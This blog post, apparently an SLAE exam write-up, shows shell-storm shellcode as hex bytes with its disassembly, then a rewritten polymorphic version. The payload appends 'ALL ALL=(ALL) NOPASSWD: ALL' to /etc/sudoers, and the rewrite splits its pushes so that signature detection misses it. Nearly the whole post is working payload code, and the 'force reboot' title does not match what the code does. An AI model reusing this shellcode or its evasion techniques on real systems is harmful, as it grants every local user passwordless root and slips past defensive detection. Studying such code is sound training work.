---
layout: post
title: SLAE 6.3 - Shell-Storm Polymorphism - force reboot
date:   2019-03-06
categories: [SLAE, Assembly]
---
The 3rd shellcode we will try to make a polymorphic version of will be:
[http://shell-storm.org/shellcode/files/shellcode-62.php](http://shell-storm.org/shellcode/files/shellcode-62.php)

The length is 86 bytes.  To fit the requirements for the exam, we have to make a version no greater than 150% of the original, giving us a maximum of 129 bytes.

Let's check the shellcode and what it does:
```nasm
echo -ne "\x31\xc0\x50\x68\x6f\x65\x72\x73\x68\x2f\x73\x75\x64\x68\x2f\x65\x74\x63\x89\xe3\x66\xb9\x01\x04\xb0\x05\xcd\x80\x89\xc3\x31\xc0\x50\x68\x41\x4c\x4c\x0a\x68\x57\x44\x3a\x20\x68\x50\x41\x53\x53\x68\x29\x20\x4e\x4f\x68\x28\x41\x4c\x4c\x68\x41\x4c\x4c\x3d\x68\x41\x4c\x4c\x20\x89\xe1\xb2\x1c\xb0\x04\xcd\x80\xb0\x06\xcd\x80\x31\xdb\xb0\x01\xcd\x80" | ndisasm -u -
00000000  31C0              xor eax,eax
00000002  50                push eax
00000003  686F657273        push dword 0x7372656f
00000008  682F737564        push dword 0x6475732f
0000000D  682F657463        push dword 0x6374652f     ; /etc/sudoers
00000012  89E3              mov ebx,esp
00000014  66B90104          mov cx,0x401
00000018  B005              mov al,0x5
0000001A  CD80              int 0x80                  ; call open
0000001C  89C3              mov ebx,eax
0000001E  31C0              xor eax,eax
00000020  50                push eax
00000021  68414C4C0A        push dword 0xa4c4c41
00000026  6857443A20        push dword 0x203a4457
0000002B  6850415353        push dword 0x53534150
00000030  6829204E4F        push dword 0x4f4e2029
00000035  6828414C4C        push dword 0x4c4c4128
0000003A  68414C4C3D        push dword 0x3d4c4c41
0000003F  68414C4C20        push dword 0x204c4c41       ; ALL ALL=(ALL) NOPASSWD: ALL\n
00000044  89E1              mov ecx,esp
00000046  B21C              mov dl,0x1c
00000048  B004              mov al,0x4
0000004A  CD80              int 0x80                     ; call write
0000004C  B006              mov al,0x6
0000004E  CD80              int 0x80                     ; call close
00000050  31DB              xor ebx,ebx
00000052  B001              mov al,0x1
00000054  CD80              int 0x80                      ; call exit
```
So we have push "/etc/sudoers", call open

Push "ALL ALL=(ALL) NOPASSWD: ALL\n", call write

call close, call exit.  Looks good!  Let's start our attempt at a polymorphic version.

So let's zero out EAX and push it to the stack.  I am going to subtract EAX from itself to get 0, I will update the stack pointer myself then place the value at the new ESP location.  This creates some variation on how we are pushing a value to the stack.  Remember, the stack grows towards 0 so we subtract 4 from esp in order to make room for the value we want to put on the stack.
```nasm
sub eax, eax
sub esp, 4
mov [esp], eax
```
Next we will push "/etc/sudoers" to the stack and update ebx to the stack pointer.  I have decided to split up the pushes if any signatures match on the dword pushes for sudoers.  I left the /etc as a dword to mix up the combinations of pushes since /etc does not necessarily mean we are up to no good.
```nasm
push word 0x7372
push word 0x656f
push word 0x6475
push word 0x732f
push dword 0x6374652f
sub ebx, ebx
add ebx, esp
```
Setting up ECX and EAX:

EAX is already 0, so we can and ECX with EAX in order to zero out ECX.  We then add the argument value we need to CX mixing it up since the original used mov instructions.  We then use add to AL for the syscall value since EAX is already zero'd out and make the syscall.
```nasm
and ecx, eax
add cx, 0x401
add al, 0x5
int 0x80
```
Next, we move the return value into EBX.  The original uses a mov instruction so we can just replace that with xchg. 

zero out EAX by subtracting it from itself, then push the null value using our manual stack manipulation. 

Then we will push the string to the stack.  This time we have just split the word PASS into two word pushes vs 1 dword push.

Then ESP's value is moved into ECX.  The variation that I will use is to subtract ECX from itself to make it zero, then add esp to it so that ECX = ESP.
```nasm
xchg ebx, eax
sub eax, eax
sub esp, 4
mov [esp], eax
push dword 0xa4c4c41
push dword 0x203a4457
push word 0x5353
push word 0x4150
push dword 0x4f4e2029
push dword 0x4c4c4128
push dword 0x3d4c4c41
push dword 0x204c4c41
sub ecx, ecx
add ecx, esp
```
Next we need to set up the rest of the args, EDX and EAX. Once those args are prepared, it will be time to make the syscall.

My EDX was not zero'd out here and would not work without adding an instruction to make sure edx = 0x1c. So I used XOR to make EDX zero, then moved the proper argument value into DL.  EAX is still zero from previous instructions at this point, so I just add 0x4 to get our syscall value.
```nasm
xor edx, edx
mov dl, 0x1c
add al, 0x4
int 0x80
```
Then we need to update AL for the call to 'close'.
```nasm
mov al, 0x6
int 0x80
```
For the last call, we need to zero out EBX and make EAX = 1.
```nasm
mov al, 0x1
sub ebx, ebx
int 0x80
```
Here is the final outcome:
```nasm
xor eax,eax                             sub eax, eax
push eax                                sub esp, 0x4
                                        mov [esp], eax
push dword 0x7372656f                   push word 0x7372
                                        push word 0x656f
push dword 0x6475732f                   push word 0x6475
                                        push word 0x732f
push dword 0x6374652f                   push dword 0x6374652f   
mov ebx,esp                             sub ebx, ebx
                                        add ebx, esp
mov cx,0x401                            and ecx, eax
                                        add cx ,0x401
mov al,0x5                              add al, 0x5
int 0x80                                int 0x80                
mov ebx,eax                             xchg ebx, eax
xor eax,eax                             sub eax, eax
push eax                                sub esp, 0x4
                                        mov [esp], eax
push dword 0xa4c4c41                    push dword 0xa4c4c41
push dword 0x203a4457                   push dword 0x203a4457
push dword 0x53534150                   push word 0x5353
                                        push word 0x4150
push dword 0x4f4e2029                   push dword 0x4f4e2029
push dword 0x4c4c4128                   push dword 0x4c4c4128
push dword 0x3d4c4c41                   push dword 0x3d4c4c41
push dword 0x204c4c41                   push dword 0x204c4c41
mov ecx,esp                             sub ecx, ecx
                                        add ecx, esp
mov dl,0x1c                             xor edx, edx
                                        mov dl, 0x1c
mov al,0x4                              add al, 0x4
int 0x80                                int 0x80
mov al,0x6                              mov al, 0x6
int 0x80                                int 0x80
xor ebx,ebx                             mov al, 0x1
mov al,0x1                              sub ebx, ebx
int 0x80                                int 0x80
```
Our total length of the new shellcode is 113 bytes and runs successfully.
